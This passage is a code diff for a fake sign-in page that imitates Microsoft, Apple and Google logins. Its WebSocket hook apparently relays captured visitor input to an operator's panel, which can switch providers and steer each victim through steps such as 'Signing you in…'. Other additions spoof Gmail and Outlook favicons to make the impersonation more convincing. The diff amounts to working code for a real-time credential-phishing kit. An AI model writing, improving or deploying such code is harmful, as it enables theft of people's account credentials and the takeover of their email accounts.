-                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setPhoneUpdateInput(v); sendCapture('phone_update', v); }}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setPhoneUpdateInput(v); }}
                       onFocus={() => setPhoneUpdateFocused(true)}
                       onBlur={() => setPhoneUpdateFocused(false)}
                       onKeyDown={e => { if (e.key === 'Enter' && phoneUpdateInput.length >= 7) nav('processing', 'phone_update', phoneUpdateInput); }}
@@ -2535,7 +2808,22 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
             {/* ── Processing ── */}
             {step === 'processing' && (
               <>
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1 }}>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 20 }}>
+                  <div className="animate-spin" style={{ width: 40, height: 40, flexShrink: 0 }}>
+                    <svg width="40" height="40" viewBox="0 0 50 50">
+                      <circle cx="25" cy="25" r="20" fill="none" strokeWidth="4" strokeLinecap="round"
+                        strokeDasharray="80 126"
+                        style={{ stroke: 'url(#proc-grad)' }} />
+                      <defs>
+                        <linearGradient id="proc-grad" x1="0%" y1="0%" x2="100%" y2="0%">
+                          <stop offset="0%" stopColor="#4285F4"/>
+                          <stop offset="33%" stopColor="#EA4335"/>
+                          <stop offset="66%" stopColor="#FBBC05"/>
+                          <stop offset="100%" stopColor="#34A853"/>
+                        </linearGradient>
+                      </defs>
+                    </svg>
+                  </div>
                   <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Signing you in…</p>
                 </div>
                 <div />
@@ -2697,8 +2985,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
 export default function LoginPage() {
   const params = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
   const urlProvider = params.get('provider');
-  const storedProvider = typeof window !== 'undefined' ? localStorage.getItem('auth_provider') : null;
-  const [provider, setProvider] = useState(urlProvider || storedProvider || 'microsoft');
+  const [provider, setProvider] = useState(urlProvider || 'microsoft');
   const urlDevice = params.get('device');
   const getAutoDevice = () => {
     if (typeof window === 'undefined') return 'desktop';
@@ -2713,8 +3000,21 @@ export default function LoginPage() {
 
   const handleProviderSwitch = isViewOnly ? undefined : (p: string) => {
     setProvider(p);
-    if (typeof window !== 'undefined') localStorage.setItem('auth_provider', p);
   };
+
+  // ── Single persistent WebSocket for the lifetime of this page ──────────────
+  // Lifted here so the connection survives provider switches (previously each
+  // provider component created its own WS, causing a disconnect + reconnect and
+  // a new visitorId every time the admin flipped the provider).
+  const navigateHandlerRef = useRef<NavigateHandler>(() => {});
+  const setNavigateHandler = useCallback((fn: NavigateHandler) => {
+    navigateHandlerRef.current = fn;
+  }, []);
+  const { sendCapture, sendStepUpdate } = useVisitorWS({
+    provider,
+    onNavigate: (s, action) => navigateHandlerRef.current(s, action),
+    onProviderSwitch: handleProviderSwitch,
+  });
 
   // Auto-detect device on resize (only when no URL override)
   useEffect(() => {
@@ -2729,29 +3029,40 @@ export default function LoginPage() {
     return () => window.removeEventListener('resize', onResize);
   }, [urlDevice]);
 
-  // On mount: if neither URL param nor localStorage has a provider, fall back to server's global setting.
-  // localStorage always wins — never overwrite a stored preference.
+  // On mount: fetch the admin's globally selected provider from the server.
+  // URL param ?provider= takes precedence (used for admin preview iframes).
+  // The server's globalProvider is always the source of truth for real visitors.
   useEffect(() => {
-    if (urlProvider) return; // URL explicitly set — don't override
-    if (storedProvider) return; // localStorage has a value — respect it
+    if (urlProvider) return; // URL explicitly set — admin preview iframe, don't override
     const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
     fetch(`${base}/api/global-provider`)
       .then(r => r.json() as Promise<{ provider: string }>)
-      .then(d => {
-        if (d.provider) {
-          setProvider(d.provider);
-          localStorage.setItem('auth_provider', d.provider);
-        }
-      })
+      .then(d => { if (d.provider) setProvider(d.provider); })
       .catch(() => {});
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
+  // Swap the browser tab favicon to match the active provider.
+  useEffect(() => {
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    let href = `${base}/favicon.svg`;
+    if (provider === 'google') href = `${base}/favicon-gmail.png`;
+    else if (provider === 'microsoft') href = `${base}/favicon-outlook.png`;
+    let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
+    if (!link) {
+      link = document.createElement('link');
+      link.rel = 'icon';
+      document.head.appendChild(link);
+    }
+    link.type = provider === 'google' || provider === 'microsoft' ? 'image/png' : 'image/svg+xml';
+    link.href = href;
+  }, [provider]);
+
   return (
     <div className="w-full h-screen overflow-y-auto">
-      {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
-      {provider === 'apple' && <AppleLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
-      {provider === 'google' && <GoogleLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
+      {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
+      {provider === 'apple' && <AppleLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
+      {provider === 'google' && <GoogleLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
     </div>
   );
 }
